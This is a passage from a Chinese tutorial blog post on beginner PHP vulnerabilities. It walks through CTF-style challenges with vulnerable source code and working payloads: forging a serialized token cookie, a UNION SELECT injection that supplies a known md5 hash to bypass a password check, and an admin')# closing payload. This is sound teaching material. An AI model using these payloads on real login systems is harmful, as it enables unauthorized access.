        <span class="token variable">$login</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">gzuncompress</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$requset</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//gzuncompress:进行字符串压缩</span>
        <span class="token comment">//unserialize: 将已序列化的字符串还原回 PHP 的值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>感觉这个绕过就非常简单了，修改 Cookie 里面的 token 就好了。</li>
</ul>
<p>写个简单的 EXP 绕一下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
	
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'ichunqiu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span> <span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">echo</span> <span class="token variable">$user</span><span class="token punctuation">;</span> 

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-密码-md5-比较绕过"><a href="#2-密码-md5-比较绕过" class="headerlink" title="2. 密码 md5 比较绕过"></a>2. 密码 md5 比较绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php

//配置数据库
if($_POST[user] &amp;&amp; $_POST[pass]) &#123;
    $conn = mysql_connect("********, "*****", "********");
    mysql_select_db("phpformysql") or die("Could not select database");
    if ($conn->connect_error) &#123;
        die("Connection failed: " . mysql_error($conn));
&#125; 

//赋值

$user = $_POST[user];
$pass = md5($_POST[pass]);

//sql语句

// select pw from php where user='' union select 'e10adc3949ba59abbe56e057f20f883e' # 

// ?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&amp;pass=123456

$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) &#123;
    printf("Error: %s\n", mysql_error($conn));
    exit();
&#125;
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];

  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;

//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。


    echo "&lt;p>Logged in! Key:************** &lt;/p>";
&#125;
else &#123;
    echo("&lt;p>Log in failure!&lt;/p>");

  &#125;
&#125;
?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>条件是 <code>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw])))</code>，而这个 <code>$row[pw]</code> 是从根据SQL语句从数据库中查询出来的，因此前面这个也就是说要在数据库中存在这个 SQL 语句对应的密码，而后面的就是校验了，看你输入的密码与数据库是否匹配，这个时候就想到了 union select 可以自己创一行数据</p>
<p>本地测试如下图</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from users where username&#x3D;&#39;&#39; union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

mysql&gt; select * from users ;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>从两个查询语句中可以看出，这个union select查询的语句明显是不存在在数据表中的，它取决于我们union select后面输入的东西的</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from users where username&#x3D;&#39;&#39; union select 1,2,database();
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | security |
+----+----------+----------+
1 row in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么如果我们用union select的话，这是不是就意味着password可控呢</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from users where username&#x3D;&#39;&#39; union select 1,2,123456;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 123456   |
+----+----------+----------+
1 row in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时查询结果，取出password，那肯定就是123456了，由于密码提交的时候有<code>$pass = md5($_POST[pass]);</code>，所以我们提交123456，到检验时中就变成了<code>e10adc3949ba59abbe56e057f20f883e</code>（md5加密后的123456），那我们这个时候不就无法做到对应了吗，不过我们是不是可以把md5加密后的密码放到SQL语句中呢，这样比对的时候不就一致了吗，因此构造payload如下</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">user&#x3D;&#39; union select 1,2,&#39;e10adc3949ba59abbe56e057f20f883e&#39; # &amp;password&#x3D;123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="3-sql闭合绕过"><a href="#3-sql闭合绕过" class="headerlink" title="3. sql闭合绕过"></a>3. sql闭合绕过</h3><p>简单的警号绕过，源码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"*******"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"****"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"****"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"****"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Could not select database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connection failed: "</span> <span class="token operator">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//select user from php where (user='admin')#</span>

<span class="token comment">//exp:admin')#</span>

<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select user from php where (user='<span class="token interpolation"><span class="token variable">$user</span></span>') and (pw='<span class="token interpolation"><span class="token variable">$pass</span></span>')"</span><span class="token punctuation">;</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: %s\n"</span><span class="token punctuation">,</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//echo $row["pw"];</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Logged in! Key: *********** &lt;/p>"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>You are not admin!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">username&#x3D;admin&#39;)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


            </div>

            
                <div class="post-copyright-info">
                    
<div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li class="post-title">
            <span class="type">本文标题</span>：<span class="content">PHP 入门基础漏洞</span>
        </li>
        <li class="post-author">
            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
        </li>
        <li class="post-time">
            <span class="type">创建时间</span>：<span class="content">2022-08-17 11:16:33</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2022/08/17/PHP-入门基础漏洞/</span>
        </li>
        <li class="post-license">
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/PHP/">#PHP</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2022/08/18/Spring%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">Spring开发学习</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Java反序列化Fastjson篇04-Fastjson1.2.62-1.2.68版本反序列化漏洞</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;评论
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
              appKey: 'ermlV1eoB1YODT088EdXjo6C',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'just go go',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return '博主'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'Drunkbaby'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PHP-%E5%9F%BA%E7%A1%80%E5%87%BD%E6%95%B0%E4%B8%8E%E7%89%B9%E6%80%A7"><span class="nav-text">0x02 PHP 基础函数与特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-get-contents"><span class="nav-text">file_get_contents</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isset"><span class="nav-text">isset</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-text">语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="nav-text">返回值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#extract"><span class="nav-text">extract</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95-1"><span class="nav-text">语法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#trim"><span class="nav-text">trim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ereg-x2F-preg-match"><span class="nav-text">ereg&#x2F;preg_match</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strcmp"><span class="nav-text">strcmp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-PHP-%E5%B8%B8%E8%A7%81%E9%BB%91%E9%AD%94%E6%B3%95"><span class="nav-text">0x03 PHP 常见黑魔法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-strcmp-%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">1. strcmp 的绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-md5-%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="nav-text">2. md5 比较绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E4%B8%80"><span class="nav-text">绕过一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E4%BA%8C"><span class="nav-text">绕过二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-extract-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E7%BB%95%E8%BF%87"><span class="nav-text">3. extract 变量覆盖绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="nav-text">4. 绕过过滤的空白字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-ereg-x2F-preg-match-%E6%AD%A3%E5%88%99-00-%E6%88%AA%E6%96%AD"><span class="nav-text">5. ereg&#x2F;preg_match 正则 %00 截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-sha-%E5%87%BD%E6%95%B0%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="nav-text">6. sha()函数比较绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-session-%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-text">7. session 验证绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-urldecode-%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">8. urldecode 二次编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-X-Forwarded-For-%E7%BB%95%E8%BF%87%E6%8C%87%E5%AE%9A-IP-%E5%9C%B0%E5%9D%80"><span class="nav-text">9. X-Forwarded-For 绕过指定 IP 地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-intval-%E5%87%BD%E6%95%B0"><span class="nav-text">10. intval 函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#intval-%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5%E7%BB%95%E8%BF%87"><span class="nav-text">intval 四舍五入绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95-preg-match-%E6%AD%A3%E5%88%99"><span class="nav-text">绕 preg_match 正则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E6%9F%90%E4%B8%AA%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%97"><span class="nav-text">绕某个具体数字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%88%E6%9E%81%E7%BB%95%E8%BF%87"><span class="nav-text">终极绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83"><span class="nav-text">11. 十六进制与数字比较</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E7%BB%93%E5%90%88-SQL"><span class="nav-text">0x04 结合 SQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-token-%E4%BC%AA%E9%80%A0"><span class="nav-text">1. token 伪造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AF%86%E7%A0%81-md5-%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="nav-text">2. 密码 md5 比较绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-sql%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="nav-text">3. sql闭合绕过</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2021</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">Drunkbaby</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>




<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
